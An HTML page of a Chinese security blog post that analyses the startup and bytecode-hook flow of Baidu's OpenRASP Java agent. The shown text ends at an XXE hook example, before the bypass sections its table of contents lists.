<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="前言最近分析了百度开源的OpenRASP这款RASP产品的启动流程及Hook流程（Java RASP部分），感觉自己对于RASP产品有了更深的理解。本篇文章将会以OpenRASP为例，介绍RASP产品的部署、检测原理及bypass方法，并尝试自己完成一个RASP的简单实现——取名为CloseRASP。因为笔者水平有限，因此这篇文章可能干货不多，如有错误或不足，希望师傅们斧正。 RASP介绍介绍RA">
<meta property="og:type" content="article">
<meta property="og:title" content="关于Java RASP的一些研究">
<meta property="og:url" content="https://r4inb00w.github.io/2023/08/06/JavaRASP/index.html">
<meta property="og:site_name" content="rainb0w">
<meta property="og:description" content="前言最近分析了百度开源的OpenRASP这款RASP产品的启动流程及Hook流程（Java RASP部分），感觉自己对于RASP产品有了更深的理解。本篇文章将会以OpenRASP为例，介绍RASP产品的部署、检测原理及bypass方法，并尝试自己完成一个RASP的简单实现——取名为CloseRASP。因为笔者水平有限，因此这篇文章可能干货不多，如有错误或不足，希望师傅们斧正。 RASP介绍介绍RA">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd5341ddac507cc8231bd.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd5541ddac507cc826f2e.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd5621ddac507cc828ca6.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd5731ddac507cc82af30.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd5811ddac507cc82ce9f.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd58f1ddac507cc82ede5.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd59c1ddac507cc830933.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd5ad1ddac507cc83293c.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd5b71ddac507cc833e67.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd5c31ddac507cc835809.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd5ce1ddac507cc836e26.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd5db1ddac507cc83882e.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd5e81ddac507cc83a490.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd5f31ddac507cc83bb5c.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd5fe1ddac507cc83d001.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd60b1ddac507cc83ecc5.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd6151ddac507cc840142.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd61f1ddac507cc84145e.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd62b1ddac507cc842d68.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd63a1ddac507cc844e4a.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd6471ddac507cc846a93.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd6531ddac507cc8484e8.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd65d1ddac507cc84997b.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd6681ddac507cc84ae51.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd6751ddac507cc84c5c6.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd67f1ddac507cc84da61.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd68b1ddac507cc84f15c.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd6971ddac507cc850a4e.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd6a21ddac507cc8522a2.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd6ab1ddac507cc8535c9.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd6b71ddac507cc854e5b.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd6c51ddac507cc856862.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd6d21ddac507cc85827c.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd6df1ddac507cc859e6a.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd6ed1ddac507cc85ba45.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd6fa1ddac507cc85da96.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd7081ddac507cc85f97b.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd7131ddac507cc860fd6.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd71e1ddac507cc8629ae.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd7291ddac507cc8643bb.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd7341ddac507cc8657eb.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd7411ddac507cc867270.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd74f1ddac507cc868ffb.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd75a1ddac507cc86a5be.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd7661ddac507cc86bfe0.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd7721ddac507cc86db09.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd7801ddac507cc86f61d.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd7891ddac507cc870802.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd7961ddac507cc872447.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd7a11ddac507cc873e11.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd7af1ddac507cc875daf.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd7be1ddac507cc877c57.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd7ca1ddac507cc8793c4.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd7d91ddac507cc87afa4.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd7e71ddac507cc87cd93.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd7f51ddac507cc87ea48.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64cfd8041ddac507cc880948.jpg">
<meta property="article:published_time" content="2023-08-06T00:00:00.000Z">
<meta property="article:modified_time" content="2023-12-10T01:02:00.040Z">
<meta property="article:author" content="rainb0w">
<meta property="article:tag" content="security">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic.imgdb.cn/item/64cfd5341ddac507cc8231bd.jpg">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>关于Java RASP的一些研究</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://baidu.com">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/08/08/Memory_WebShell/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/05/15/htb-dante/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://r4inb00w.github.io/2023/08/06/JavaRASP/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://r4inb00w.github.io/2023/08/06/JavaRASP/&text=关于Java RASP的一些研究"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://r4inb00w.github.io/2023/08/06/JavaRASP/&title=关于Java RASP的一些研究"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://r4inb00w.github.io/2023/08/06/JavaRASP/&is_video=false&description=关于Java RASP的一些研究"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=关于Java RASP的一些研究&body=Check out this article: https://r4inb00w.github.io/2023/08/06/JavaRASP/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://r4inb00w.github.io/2023/08/06/JavaRASP/&title=关于Java RASP的一些研究"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://r4inb00w.github.io/2023/08/06/JavaRASP/&title=关于Java RASP的一些研究"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://r4inb00w.github.io/2023/08/06/JavaRASP/&title=关于Java RASP的一些研究"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://r4inb00w.github.io/2023/08/06/JavaRASP/&title=关于Java RASP的一些研究"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://r4inb00w.github.io/2023/08/06/JavaRASP/&name=关于Java RASP的一些研究&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://r4inb00w.github.io/2023/08/06/JavaRASP/&t=关于Java RASP的一些研究"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RASP%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">RASP介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OpenRASP%E7%A0%94%E7%A9%B6"><span class="toc-number">3.</span> <span class="toc-text">OpenRASP研究</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OpenRASP%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.1.</span> <span class="toc-text">OpenRASP启动流程分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OpenRASP-Hook"><span class="toc-number">3.2.</span> <span class="toc-text">OpenRASP Hook</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demo-RASP%E5%AE%9E%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">Demo RASP实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-OpenRASP"><span class="toc-number">5.</span> <span class="toc-text">Bypass OpenRASP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Unsafe%E7%BB%95%E8%BF%87"><span class="toc-number">5.1.</span> <span class="toc-text">Unsafe绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%97%ADOpenRASP%E5%BC%80%E5%85%B3"><span class="toc-number">5.2.</span> <span class="toc-text">关闭OpenRASP开关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cp%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87RASP"><span class="toc-number">5.3.</span> <span class="toc-text">cp命令绕过RASP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        关于Java RASP的一些研究
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">rainb0w</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-08-06T00:00:00.000Z" class="dt-published" itemprop="datePublished">2023-08-06</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/security/" rel="tag">security</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近分析了百度开源的OpenRASP这款RASP产品的启动流程及Hook流程（Java RASP部分），感觉自己对于RASP产品有了更深的理解。本篇文章将会以OpenRASP为例，介绍RASP产品的部署、检测原理及bypass方法，并尝试自己完成一个RASP的简单实现——取名为CloseRASP。因为笔者水平有限，因此这篇文章可能干货不多，如有错误或不足，希望师傅们斧正。</p>
<h2 id="RASP介绍"><a href="#RASP介绍" class="headerlink" title="RASP介绍"></a>RASP介绍</h2><p>介绍RASP之前，我们先看看什么是WAF？</p>
<blockquote>
<p>WAF（Web 应用程序防火墙）通过过滤和监控 Web 应用程序与互联网之间的 HTTP 流量来帮助保护 Web 应用程序。它通常可以保护 Web 应用程序，使其免受跨站点伪造、跨站点脚本 (XSS)、文件包含、SQL 注入及其他一些攻击的影响。</p>
</blockquote>
<p>很多时候我们在进行攻击时遇到的都是基于流量规则对攻击行为进行过滤的WAF，WAF相比RASP误报率高，绕过率高，且市面上也有很多针对不同waf的绕过方式。而RASP是一种运行时应用程序自我保护的技术，全称“Runtime application self-protection”。它是通过JavaAgent利用Instrumentation在指定的class加载之后，调用指定的ClassFileTransformer实现类的transform方法，通过使用ASM（或者其他字节码修改框架）技术来hook目标class的method，在方法的开头或结尾插入检测攻击的代码，之后将hook好的字节码返回给transformer从而加载到JVM中。因此可以说JavaAgent就是Java RASP技术的基础。（建议读者先了解JavaAgent及Javassist再阅读本文）</p>
<h2 id="OpenRASP研究"><a href="#OpenRASP研究" class="headerlink" title="OpenRASP研究"></a>OpenRASP研究</h2><p>OpenRASP 抛弃了传统防火墙依赖请求特征检测攻击的模式，创造性的使用RASP技术（应用运行时自我保护），直接注入到被保护应用的服务中提供函数级别的实时防护，可以在不更新策略以及不升级被保护应用代码的情况下检测&#x2F;防护未知漏洞，尤其适合大量使用开源组件的互联网应用以及使用第三方集成商开发的金融类应用。我们先看看OpenRASP在Tomcat中是怎样手动安装的：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd5341ddac507cc8231bd.jpg" alt="image-20230805164731893"></p>
<p>在OpenRASP中除了RaspInstall.jar这个用来安装OpenRASP的jar包外，还有rasp.jar和rasp-engine.jar这两个jar包。可以看到在Tomcat中手动安装OpenRASP的话，需要增加-javaagent项设置为rasp.jar。老惯例，先看看MAINFEST.MF，以下是rasp.jar的MAINFEST.MF文件的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Build-Time: 2022-01-28T09:49:33Z</span><br><span class="line">Last-Commit-User-Email: CaledoniaProject@users.noreply.github.com</span><br><span class="line">Built-By: root</span><br><span class="line">Premain-Class: com.baidu.openrasp.Agent</span><br><span class="line">Created-By: Apache Maven 3.2.3</span><br><span class="line">Git-Branch: master</span><br><span class="line">Git-Commit: a0634d6</span><br><span class="line">Last-Commit-User-Name: CaledoniaProject</span><br><span class="line">Build-Jdk: 1.6.0_45</span><br><span class="line">Project-Version: 1.3.7</span><br><span class="line">Agent-Class: com.baidu.openrasp.Agent</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Main-Class: com.baidu.openrasp.Agent</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Archiver-Version: Plexus Archiver</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们只关心Premain-Class、Agent-Class、Can-Redefine-Classes、Main-Class和Can-Retransform-Classes这5个配置。可以看到Main-Class是com.baidu.openrasp.Agent，若是执行这个rasp.jar，代码将从com.baidu.openrasp.Agent#main开始。Premain-Class也是com.baidu.openrasp.Agent，因为设置了-javaagent项，因此若运行利用Tomcat部署Web项目时会首先执行com.baidu.openrasp.Agent#premain。Can-Redefine-Classes和Can-Retransform-Classes这两个配置项因为要重新定义class必然设置为true不必说。Agent-Class指定的也是com.baidu.openrasp.Agent，那么当attach目标class的时候就会执行com.baidu.openrasp.Agent#agentmain。</p>
<h3 id="OpenRASP启动流程分析"><a href="#OpenRASP启动流程分析" class="headerlink" title="OpenRASP启动流程分析"></a>OpenRASP启动流程分析</h3><p>在IDEA调试时，可以在右上角的Tomcat配置中加上VM Options，通过-javaagent项指定rasp.jar。因为配置了<code>-javaagent</code>，因此首先进入com.baidu.openrasp.Agent#premain：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd5541ddac507cc826f2e.jpg" alt="image-20230805165633563"></p>
<p>跟进init方法：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd5621ddac507cc828ca6.jpg" alt="image-20230805165926450"></p>
<p>以下是JarFileHelper的addJarToBootstrap方法：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd5731ddac507cc82af30.jpg" alt="image-20230805170651161"></p>
<p>这里通过Instrumentation的<code>appendToBootstrapClassLoaderSearch</code>方法，把rasp.jar包放到Bootstrap ClassLoader的搜索路径。解释一下为什么这样做，因为java的双亲委派机制，我们需要将<code>rasp.jar</code>包加入到了<code>BootStrapClassLoader</code>下，否则当我们需要hook像 java.io.File或者java.lang.ProcessImpl 这样由 <code>BootstrapClassLoader</code> 加载的类的时候，就无法检测到了。因此将 rasp.jar 添加到 <code>BootstrapClassLoader</code> 的ClassPath下，收到类加载委派任务时，就能通过该classpath加载到rasp.jar的所有类了，那么，也就意味着，任何一个类加载器中的任何一个类，都能通过显式或者隐式加载，加载到rasp.jar中的类。</p>
<p>之后调用了ModuleLoader.load()，这个函数的作用是用来加载和初始化引擎模块，即之前提到的rasp-engine.jar，跟进一下：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd5811ddac507cc82ce9f.jpg" alt="image-20230805171655179"></p>
<p>这里创建了一个ModuleLoader实例，继续跟进：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd58f1ddac507cc82ede5.jpg" alt="image-20230805171740140"></p>
<p>从函数名就可以知道这个<code>setStartupOptionForJboss</code>函数是用来为Jboss设置一些起始选项的，跟进一下：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd59c1ddac507cc830933.jpg" alt="image-20230805172119071"></p>
<p>这里通过获取到系统类加载器加载字节码class的路径后，判断是否有jboss-modules.jar，很明显，我们使用Tomcat没有这个jar包。若判断是Jboss中间件的话，会调用setSystemProperty函数设置相关属性和预加载包：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd5ad1ddac507cc83293c.jpg" alt="image-20230805172333798"></p>
<p>之后继续执行：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd5b71ddac507cc833e67.jpg" alt="image-20230805172428128"></p>
<p>创建了一个ModuleContainer实例，传入了包名rasp-engine.jar，进入ModuleContainer的构造函数：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd5c31ddac507cc835809.jpg" alt="image-20230805172647805"></p>
<p>首先创建一个JarFile对象指向rasp-engine.jar文件，然后获取jar包中的MAINFEST.MF文件中的属性，将Rasp-Module-Name的值赋值给this.moduleName，将Rasp-Module-Class的值赋值给moduleEnterClassName。Rasp-Module-Class的值是com.baidu.openrasp.EngineBoot：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd5ce1ddac507cc836e26.jpg" alt="image-20230805173137167"></p>
<p>之后将com.baidu.openrasp.EngineBoot实例化赋值给this.module：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd5db1ddac507cc83882e.jpg" alt="image-20230805173119508"></p>
<p>代码中是通过ModuleLoader.moduleClassLoader来加载com.baidu.openrasp.EngineBoot的，而moduleClassLoader在ModuleLoader类中的static块中有所定义：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader systemClassLoader;</span><br><span class="line"><span class="keyword">for</span>(systemClassLoader = ClassLoader.getSystemClassLoader(); systemClassLoader.getParent() != <span class="literal">null</span> &amp;&amp; !systemClassLoader.getClass().getName().equals(<span class="string">&quot;sun.misc.Launcher$ExtClassLoader&quot;</span>); systemClassLoader = systemClassLoader.getParent()) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">moduleClassLoader = systemClassLoader;</span><br></pre></td></tr></table></figure>

<p>扩展类加载器的父类加载器为启动类加载器，即Bootstrap ClassLoader，因此moduleClassLoader是启动类加载器，这里需要记一下。之后ModuleContainer的构造方法结束，继续执行com.baidu.openrasp.ModuleContainer#start，以下是该方法：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd5e81ddac507cc83a490.jpg" alt="image-20230805173319080"></p>
<p>调用了com.baidu.openrasp.EngineBoot的start方法，在该方法中进行了：输出Banner信息，加载V8引擎、初始化插件系统、配置核查、初始化字节码转换模块、初始化云管理模块等操作，我们跟进一下：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd5f31ddac507cc83bb5c.jpg" alt="image-20230805173434615"></p>
<p>首先输出了Banner，我们可以在运行日志中看到：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd5fe1ddac507cc83d001.jpg" alt="image-20230805173518945"></p>
<p>之后执行了<code>Loader.load();</code>，跟进一下：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd60b1ddac507cc83ecc5.jpg" alt="image-20230805174227846"></p>
<p><img src="https://pic.imgdb.cn/item/64cfd6151ddac507cc840142.jpg" alt="image-20230805174240220"></p>
<p>可以看到，加载了一个JNI库文件。此处完成V8引擎的加载，用于解释执行JavaScript。OpenRasp的一大特色就是将部分规则通过JS插件的形式来实现编写，这样做有两个优势，一是可以实现<strong>跨平台使用</strong>，减少了为不同语言重复制定相同规则的问题。另一个就是可以<strong>实现规则的热部署</strong>，添加或修改规则不需要重新启动服务。接着调用了<code>com.baidu.openrasp.EngineBoot#loadConfig</code>，完成初始化log4j、检查云控配置信息以及读取配置信息，初始化syslog服务连接等操作：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd61f1ddac507cc84145e.jpg" alt="image-20230805174833561"></p>
<p>接着又执行了<code>JS.Initialize()</code>，跟进一下：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd62b1ddac507cc842d68.jpg" alt="image-20230805181639916"></p>
<p>设置v8获取栈信息的getter方法，这里获得的栈信息，每一条信息包括类名、方法名和行号classname@methodname(linenumber)。紧接着是对插件的更新：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd63a1ddac507cc844e4a.jpg" alt="image-20230805182223918"></p>
<p>获取plugins目录下的文件进行过滤，其中要求后缀名为.js，之后获取到合法的plugin文件后，将文件的名字和内容添加到scripts，并执行<code>UpdatePlugin(scripts);</code>，使用V8引擎进行信息的提取。之后调用<code>InitFileWatcher</code>方法来实现对js配置文件的监听事件，从而实现热部署，动态的增删js中的检测规则：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd6471ddac507cc846a93.jpg" alt="image-20230805183104173"></p>
<p>紧接着调用<code>CheckerManager.init()</code>：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd6531ddac507cc8484e8.jpg" alt="image-20230805183947706"></p>
<p>Type类如下：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd65d1ddac507cc84997b.jpg" alt="image-20230805184036441"></p>
<p>从枚举类com.baidu.openrasp.plugin.checker.CheckParameter.Type中读取所有的checker，包含三种类型的checker，一是js插件检测，意味着这个checker会调用js plugin进行攻击检测，二是java本地检测，意味着是调用本地java代码进行攻击检测，三是安全基线检测，是用于检测一些高风险类的安全性基线检测，检测其配置是否有安全隐患。</p>
<p>进接着调用<code>this.initTransformer(inst)</code>，跟进：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd6681ddac507cc84ae51.jpg" alt="image-20230805184657314"></p>
<p>CustomClassTransformer是ClassFileTransformer的实现类，以下是该类的一种构造方法：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd6751ddac507cc84c5c6.jpg" alt="image-20230805184756487"></p>
<p>addTransformer()中指定的transfromer为自己，也就是CustomClassTransformer，之后执行addAnnotationHook()：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd67f1ddac507cc84da61.jpg" alt="image-20230805185014583"></p>
<p>这个方法的作用就是扫描com.baidu.openrasp.hook包下有@HookAnnotation注解的类，之后循环调用addHook()方法，将所有不是配置文件中hooks.ignore指定的类型的对象添加到this.hooks中：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd68b1ddac507cc84f15c.jpg" alt="image-20230805190113349"></p>
<p>这个hooks字段是用来提供在后续类加载通过com.baidu.openrasp.transformer.CustomClassTransformer#transform的时候，对其进行匹配，判断是否需要hook。接下来回到com.baidu.openrasp.EngineBoot#initTransformer中，调用了com.baidu.openrasp.transformer.CustomClassTransformer#retransform：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd6971ddac507cc850a4e.jpg" alt="image-20230805190139754"></p>
<p><img src="https://pic.imgdb.cn/item/64cfd6a21ddac507cc8522a2.jpg" alt="image-20230805190728654"></p>
<p>通过调用isClassMatched判断这个类是否是Hook的类：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd6ab1ddac507cc8535c9.jpg" alt="image-20230805190933320"></p>
<p>通过迭代this.hooks，调用对应的isClassMatched()方法进行匹配，如果需要hook，则调用retransformClasses()对该class进行重新定义，重新触发对该类的拦截，那我们接下来看一下<code>com.baidu.openrasp.transformer.CustomClassTransformer#transform</code>方法：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd6b71ddac507cc854e5b.jpg" alt="image-20230805224633278"></p>
<p>在这里依然不断循环迭代hooks，对class进行匹配，之后调用hook类的transformClass方法：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd6c51ddac507cc856862.jpg" alt="image-20230805225328777"></p>
<p>又调用了hookMethod()方法来进行字节码的修改。</p>
<h3 id="OpenRASP-Hook"><a href="#OpenRASP-Hook" class="headerlink" title="OpenRASP Hook"></a>OpenRASP Hook</h3><p>那接下来，我们挑一个例子来看看OpenRASP的Hook流程，例如com.baidu.openrasp.hook.xxe.XXEHook。我们首先看看com.baidu.openrasp.hook.xxe.XXEHook#isClassMatched，了解一下是如何对需要hook的类做匹配的，该方法如下所示：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd6d21ddac507cc85827c.jpg" alt="image-20230805234958546"></p>
